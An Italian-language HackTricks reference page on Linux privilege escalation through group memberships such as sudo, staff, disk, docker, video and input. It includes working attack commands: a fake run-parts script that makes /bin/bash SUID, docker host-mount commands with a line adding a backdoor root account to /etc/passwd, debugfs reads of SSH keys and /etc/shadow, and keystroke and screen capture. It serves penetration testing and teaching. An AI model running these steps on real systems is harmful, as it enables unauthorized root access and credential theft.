# Gruppi interessanti - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Gruppi Sudo/Admin

### **PE - Method 1**

**A volte**, la policy **/etc/sudoers** di un sistema (o un file incluso al suo interno) contiene voci come:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Questo significa che qualsiasi utente corrispondente a una delle due voci può eseguire qualsiasi comando come qualsiasi utente di destinazione tramite `sudo` (nel rispetto del resto della policy).<sup>[[3]](#references)</sup>

Se è così, per **diventare root basta eseguire**:

```
sudo su
```

Se `sudo -l` consente un'invocazione limitata di `adduser` con il solo nome utente, verifica se crea un gruppo primario con lo stesso nome, qualora non esista già. Un nuovo account appartenente a quel gruppo potrebbe ottenere privilegi se la policy sudoers effettiva li concede già a `%group`; verifica sia il comportamento di creazione del gruppo sia la regola del gruppo prima di considerare questa una via di escalation. La creazione di un account modifica il sistema, quindi esamina prima la policy.

### PE - Method 2

Trova tutti i binari suid e controlla se è presente il binario **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Se **pkexec è un binario SUID**, può eseguire un programma come un altro utente solo quando polkit autorizza l'azione richiesta; il bit SUID da solo non garantisce l'accesso a root. Controlla i criteri installati e l'autorizzazione della sessione di destinazione, invece di presumere che appartenere a **sudo** o **admin** sia sufficiente.<sup>[[4]](#references)[[5]](#references)</sup>

Per il percorso separato [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), verifica innanzitutto che `pkexec` sia un file eseguibile **SUID di proprietà di root**. Un binario installato senza quel bit non è il caso di escalation locale tramite SUID descritto nell'advisory. La stringa della versione upstream è solo un indizio: le distribuzioni possono [retroportare la correzione in versioni meno recenti dei pacchetti](https://ubuntu.com/security/CVE-2021-4034), quindi verifica il pacchetto del vendor installato e le mitigazioni prima di dichiarare che è vulnerabile.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) riguarda un percorso polkit diverso: una race condition nell'autorizzazione D-Bus, non una vulnerabilità SUID di `pkexec`. Esamina il pacchetto polkit del vendor installato e verifica se un'azione D-Bus privilegiata raggiungibile può apportare una modifica utile; un percorso di creazione degli account richiede anche un servizio adatto, come AccountsService, e l'accesso a sudo del nuovo gruppo dipende dai criteri sudo effettivi. Una versione polkit segnalata o un servizio installato sono soltanto elementi da verificare, soprattutto nei casi in cui i vendor [retroportano le correzioni](https://access.redhat.com/security/cve/cve-2021-3560). L'enumerazione passiva non deve innescare la race condition.

Nelle distribuzioni che usano ancora il backend Local Authority meno recente, esamina le sue regole di gruppo con:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

I nomi dei gruppi rilevanti e le impostazioni predefinite variano a seconda della distribuzione; un gruppo è utile in questo caso solo se è previsto dalla policy locale.<sup>[[5]](#references)</sup>

Per **diventare root puoi eseguire**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Se provi a eseguire **pkexec** e ricevi questo **errore**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

In una sessione SSH senza un agent di autenticazione registrato, `pkexec` può non funzionare con questo errore anche quando la policy consentirebbe l’azione; polkit documenta `pkttyagent` come agent di autenticazione testuale per le sessioni non desktop. Il comportamento esatto dipende dalla versione e dalla distribuzione, quindi verifica la policy locale e la configurazione dell’agent. Una soluzione alternativa segnalata per le versioni di NixOS interessate richiede **2 sessioni SSH diverse**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Una ACL che nega a un account l’accesso a `su` si applica a quell’eseguibile, non a ogni possibile via per eseguire un’azione autorizzata dall’amministratore. Se le credenziali di un amministratore sono esposte separatamente, verifica se la policy polkit effettiva consente un’azione distinta, come avviare un servizio di sistema transitorio tramite `systemd-run`, quale identità accetta l’agent di autenticazione e quale identità userebbe il servizio risultante. [Polkit distingue l’autenticazione come proprietario della sessione da quella come amministratore](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), mentre [systemd-run può richiedere un servizio transitorio al gestore di sistema](https://systemd.io/CONTROL_GROUP_INTERFACE/). Una voce nella cronologia, un comando installato o un file di policy leggibile, da soli, non dimostrano l’autorizzazione né la validità delle credenziali; una verifica passiva non dovrebbe inviare credenziali né avviare un’unità.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Gruppo Wheel

A volte una policy sudoers può contenere anche questa voce:

```
%wheel	ALL=(ALL:ALL) ALL
```

Questo significa che qualsiasi utente corrispondente alla voce può eseguire qualsiasi comando come qualsiasi utente di destinazione tramite `sudo` (nel rispetto del resto della policy).<sup>[[3]](#references)</sup>

Se è così, per **diventare root basta eseguire**:

```
sudo su
```

## Gruppo shadow

Sui sistemi in cui i permessi lo consentono, gli utenti appartenenti al gruppo **shadow** possono **leggere** **/etc/shadow**; verifica i permessi effettivi e le ACL sul target:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Quindi, leggi il file e prova a crackare alcuni hash.

Una precisazione sullo stato dei lock durante il triage degli hash:
- Le voci con `!` o `*` in genere non consentono l’accesso interattivo con password.
- `!hash` significa che la password è stata bloccata; i caratteri rimanenti rappresentano il campo password precedente al blocco.
- Un campo contenente `*` non è un hash `crypt(3)` valido e impedisce l’accesso UNIX con password; non dedurne se una password fosse stata impostata in precedenza.
Questo è utile per classificare gli account anche quando l’accesso diretto è bloccato.<sup>[[6]](#references)</sup>

## Gruppo staff

**staff**: Consente agli utenti di aggiungere modifiche locali al sistema (`/usr/local`) senza bisogno dei privilegi di root (nota che gli eseguibili in `/usr/local/bin` si trovano nella variabile PATH di qualsiasi utente e possono "sovrascrivere" gli eseguibili con lo stesso nome in `/bin` e `/usr/bin`). Confrontalo con il gruppo "adm", più legato al monitoraggio e alla sicurezza.<sup>[[2]](#references)[[7]](#references)</sup>

Nelle configurazioni Debian in cui `/usr/local/bin` precede `/usr/bin` in `PATH` (come negli esempi seguenti), un comando non qualificato viene risolto prima usando la copia in `/usr/local/bin`; verifica il `PATH` effettivo sul sistema di destinazione.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Se un processo privilegiato risolve un comando non qualificato tramite una directory `/usr/local/bin` scrivibile, sostituire quel comando può consentirne l'esecuzione con i privilegi del processo; prima di eseguire test, verifica il percorso effettivo e il modo in cui viene avviato.

Nei sistemi Ubuntu, `pam_motd` esegue script eseguibili tramite `run-parts --lsbsysinit` come root al login; anche i job cron possono usare `run-parts`, ma questo dipende dalla distribuzione e dalla configurazione.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Al momento di un nuovo accesso SSH, `pspy` può aiutare a confermare se questo percorso viene effettivamente invocato sul target; può osservare le righe di comando dei processi senza root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Gruppo disk

L'appartenenza al gruppo **disk** può garantire l'accesso raw ai dispositivi a blocchi ed è spesso **quasi equivalente all'accesso root**; Debian lo descrive come perlopiù equivalente a root, ma verifica le autorizzazioni effettive dei dispositivi e la disposizione dello storage sul target.<sup>[[7]](#references)</sup>

I percorsi comuni dei dispositivi includono `/dev/sd*`, ma NVMe e altre configurazioni di storage usano nomi diversi.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` opera sui filesystem ext2/ext3/ext4; percorsi come `/root` e `/etc/shadow` citati sopra sono file all'interno del filesystem aperto, mentre il secondo argomento di `dump` è un percorso di output sul filesystem nativo.<sup>[[8]](#references)</sup> Ad esempio, questo estrae `/tmp/asd1.txt` dal filesystem aperto in `/tmp/asd2.txt` sul filesystem nativo:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

L'opzione `-w` apre il filesystem in lettura e scrittura, mentre il comando `write` copia un file nativo nel filesystem aperto. Evita di usarlo su un filesystem live montato, perché le modifiche dirette possono corrompere il filesystem; quando possibile, lavora su un'immagine offline.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

Usando il comando `w` puoi scoprire **chi ha effettuato l'accesso al sistema** e verrà mostrato un output simile al seguente.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

La voce **tty1** identifica la prima console virtuale Linux; da sola non dimostra che un utente sia fisicamente presente alla macchina, soprattutto nei container o in altri ambienti.<sup>[[21]](#references)</sup>

Nei sistemi che espongono un dispositivo framebuffer leggibile, l’appartenenza al gruppo **video** può concedere l’accesso a quel dispositivo. L’interfaccia framebuffer Linux documenta `/dev/fb0` come un dispositivo di memoria leggibile che può essere copiato per acquisire un’immagine dello schermo; il percorso `/sys/class/graphics/fb0/virtual_size` è disponibile solo quando è presente il relativo attributo fbdev sysfs, quindi verifica prima il sistema di destinazione.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Se la versione di **GIMP** installata include un importatore di dati grezzi, apri **`screen.raw`** con tale importatore; il supporto e i controlli variano in base alla versione e al plug-in.<sup>[[22]](#references)</sup>

![Gruppo Disk - Gruppo Video: per aprire l'immagine grezza puoi usare GIMP, selezionare il file screen.raw e scegliere Raw image data come tipo di file](<../../../images/image (463).png>)

Imposta larghezza e altezza dell'immagine in modo che corrispondano alla geometria del framebuffer; prova i formati pixel e i tipi di immagine disponibili finché l'output non è leggibile.<sup>[[9]](#references)</sup>

![Gruppo Disk - Gruppo Video: modifica quindi larghezza e altezza impostandole ai valori usati sullo schermo e prova diversi tipi di immagine (seleziona quello che mostra meglio lo schermo)](<../../../images/image (317).png>)

## Gruppo Input

Nei sistemi in cui il gruppo `input` dispone dell'accesso in lettura ai dispositivi di eventi della tastiera, un membro può osservare le pressioni dei tasti grezze provenienti da quel dispositivo. Controlla prima i permessi effettivi e le ACL: una sessione locale attiva può ottenere l'accesso tramite un'ACL `uaccess`, e il solo nome del gruppo non garantisce l'accesso.<sup>[[23]](#references)[[24]](#references)</sup>

Individua il gestore `eventX` della tastiera, verifica che l'account corrente possa leggere il relativo nodo, quindi monitora un breve test autorizzato con `evtest`. **Non** usare `--grab`: acquisisce l'accesso esclusivo e può impedire ad altre applicazioni di ricevere input.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` segnala i codici dei tasti, non il testo completo: il valore `1` indica la pressione, `0` il rilascio e `2` la ripetizione. Questo può rivelare i tasti digitati in un'altra sessione usando quella tastiera fisica, incluse le credenziali, ma non concede di per sé l'accesso root. Un compositor desktop non impedisce l'accesso al nodo del dispositivo raw.<sup>[[25]](#references)</sup>

Per i controlli più ampi su identità e sessioni, consulta [users and sessions](../user-and-session-triage.md).

## Root Group

L'appartenenza al gruppo **root** non assegna l'UID di root, ma i file scrivibili dal gruppo e di proprietà di `root` possono comunque essere interessanti se vengono usati da servizi o librerie con privilegi. Verifica i permessi effettivi del file e il modo in cui viene usato prima di considerarlo un possibile percorso di privilege escalation.

**Controlla quali file i membri del gruppo root possono modificare**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Gruppo Docker

L'appartenenza al gruppo `docker` concede accesso a livello root al daemon Docker nelle installazioni standard con root. Poiché i bind mount sono di lettura e scrittura per impostazione predefinita, un utente che può controllare quel daemon può montare `/` dell'host in un container e modificare i file dell'host; questo equivale di fatto ad avere i privilegi root sull'host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

L'appartenenza ai gruppi potrebbe non essere sincronizzata tra `/etc/group`, `/etc/gshadow` e il token del processo corrente. Se un utente non compare in `id -nG` ma `newgrp docker` ha esito positivo, controlla il gruppo mostrato da `id` nella nuova shell e verifica se il socket Docker è effettivamente scrivibile e serve un daemon con root. Il solo nome del gruppo non implica il controllo dell'host. Limita qualsiasi probe automatica con `newgrp` per evitare che una richiesta di password blocchi l'enumerazione.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Infine, se non ti piace nessuno dei suggerimenti precedenti o non funzionano per qualche motivo (firewall delle API di docker?), puoi sempre provare a **eseguire un container con privilegi ed evadere da esso**, come spiegato qui:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Se hai permessi di scrittura sul socket di docker, leggi [**questo post su come aumentare i privilegi abusando del socket di docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Gruppo lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Gruppo Adm

Di solito i **membri** del gruppo **`adm`** hanno i permessi per **leggere i file di log** che si trovano in _/var/log/_.\
Pertanto, se hai compromesso un utente appartenente a questo gruppo, dovresti assolutamente **dare un'occhiata ai log**.<sup>[[7]](#references)</sup>

## Gruppi Backup / Operator / lp / Mail

Questi gruppi hanno significati specifici in base al servizio e alla distribuzione. Debian documenta `backup` per le operazioni di backup/ripristino delegate, `lp` per i demoni di stampa e `mail` per `/var/mail`; quindi, verifica i permessi locali prima di considerare l'appartenenza a uno di questi gruppi come una via per ottenere privilegi.<sup>[[7]](#references)</sup>

Spesso rappresentano vettori di **individuazione di credenziali** piuttosto che vie dirette per ottenere root:
- **backup**: può esporre archivi contenenti configurazioni, chiavi, dump di DB o token.
- **operator**: accesso operativo specifico della piattaforma che può causare la fuoriuscita di dati sensibili a runtime.
- **lp**: le code e gli spool di stampa possono contenere il contenuto dei documenti.
- **mail**: gli spool di posta possono esporre link di reimpostazione, OTP e credenziali interne.

Considera l'appartenenza a questi gruppi come un'esposizione di dati di alto valore e procedi verificando il riutilizzo di password/token.

## Gruppo Auth

Su OpenBSD, quando S/Key è configurato, `/etc/skey` appartiene a `root:auth` e per accedere ai relativi record è necessario il gruppo `auth`; i record YubiKey sono archiviati in `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Una configurazione vulnerabile di OpenBSD 6.6 con S/Key o YubiKey abilitato permetteva agli utenti locali con privilegi `auth` di diventare root; Qualys documenta i prerequisiti e la catena di exploit, mentre la PoC collegata li implementa.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [Autenticazione pkexec/pkttyagent senza una sessione GUI (segnalazione NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Gruppi di sistema - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — pagine man di Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manuale di riferimento di polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manuale di riferimento di polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manuale per la messa in sicurezza di Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — pagina del manuale di Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Il dispositivo Frame Buffer — documentazione del kernel Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — pagine man di Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — pagine man di Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — monitoraggio non privilegiato dei processi Linux](https://github.com/DominicBreuker/pspy)
- [13] [Sicurezza di Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Gestire Docker come utente non root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Esecuzione dei container — documentazione di Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — pagine del manuale di OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — pagine del manuale di OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnerabilità di autenticazione in OpenBSD — avviso di sicurezza Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC di exploit locale](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dispositivi allocati di Linux (versione 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importazione ed esportazione delle immagini — documentazione di GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [Indicazioni sui permessi del dispositivo beep — sorgenti Debian](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — manuale di systemd](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Codici degli eventi di input — documentazione del kernel Linux](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — pagine man di Debian](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
